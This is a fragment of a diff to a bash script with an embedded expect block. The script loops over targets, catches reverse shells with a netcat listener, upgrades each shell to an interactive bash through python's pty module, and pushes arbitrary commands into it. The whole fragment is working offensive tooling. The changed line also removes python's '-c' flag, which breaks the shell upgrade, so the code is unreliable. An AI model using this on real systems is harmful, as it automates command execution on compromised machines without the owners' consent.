@@ -25,7 +25,7 @@ for TARGET in "${TARGETS[@]}"; do
 expect << EOF
 spawn nc -lvnp $PORT
 expect -re "\[#\$\] "
-send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
+send "python3 'import pty;pty.spawn(\"/bin/bash\")'\r"
 $(for cmd in "$@"; do
     echo "expect -re \"\[#\$\] \""
     echo "send \"$cmd\r\""
